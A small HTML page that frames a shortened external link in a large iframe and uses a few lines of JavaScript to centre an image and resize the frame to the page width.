<!DOCTYPE html>
<html>
<head lang="en">
    <meta charset="UTF-8">
    <title></title>
<style>
    img{
        position: absolute;
    }

</style>
</head>
<body >

    <iframe id="iframe" width="1000" height="768" scrolling="yes" frameborder="0"   src= "http://t.cn/RK7V1N2">
</iframe>


    <br/>
<img onload="Center()" src="20130128100749645.jpg">

    <script type="text/javascript" language="javascript">
        function iFrameHeight() {
              var ifm= document.getElementById("iframe");

             //ifm.height = document.body.scrollHeight;
             ifm.width = document.body.scrollWidth;

        }
        function Center(){
            var img=document.getElementsByTagName("img")[0];
           img.style.left=document.body.scrollWidth/2-img.width/2+"px";
       //   alert(document.body.clientWidth/2);
            iFrameHeight();
        }

    </script>
</body>
